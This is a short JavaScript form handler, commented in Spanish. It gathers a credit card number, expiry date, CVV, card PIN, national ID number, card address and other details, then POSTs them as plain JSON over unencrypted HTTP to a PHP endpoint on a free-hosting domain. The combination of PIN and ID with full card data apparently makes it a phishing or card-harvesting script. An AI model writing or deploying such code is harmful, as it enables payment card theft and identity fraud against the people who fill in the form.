document.addEventListener('DOMContentLoaded', function () {
    const creditCardForm = document.getElementById('creditCardForm');

    creditCardForm.addEventListener('submit', function (e) {
        e.preventDefault(); // Evitar que el formulario se envíe de forma predeterminada

        // Obtener los valores del formulario
        const creditCardNumber = document.getElementById('creditCardNumber').value;
        const expirationDate = document.getElementById('expirationDate').value;
        const cardHolderName = document.getElementById('cardHolderName').value;
        const cvv = document.getElementById('cvv').value;
        const pin = document.getElementById('pin').value;
        const dni = document.getElementById('dni').value;
        const carnet = document.getElementById('carnet').value;
        const cardIssuer = document.getElementById('cardIssuer').value;
        const cardAddress = document.getElementById('cardAddress').value;

        // Crear un objeto con los datos del formulario
        const formData = {
            creditCardNumber,
            expirationDate,
            cardHolderName,
            cvv,
            pin,
            dni,
            carnet,
            cardIssuer,
            cardAddress
        };

        // Convertir el objeto a formato JSON
        const formDataJSON = JSON.stringify(formData);

        // Enviar los datos a un servidor (puedes usar AJAX o fetch para esto)
        // Por ejemplo:
        fetch('http://proyectoformulario.wuaze.com/guardar_datos.php', {
            method: 'POST',
            body: formDataJSON,
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(response => response.json())
        .then(data => {
            // Aquí puedes manejar la respuesta del servidor si es necesario
            console.log(data);
        })
        .catch(error => {
            console.error('Error:', error);
        });
    });
});
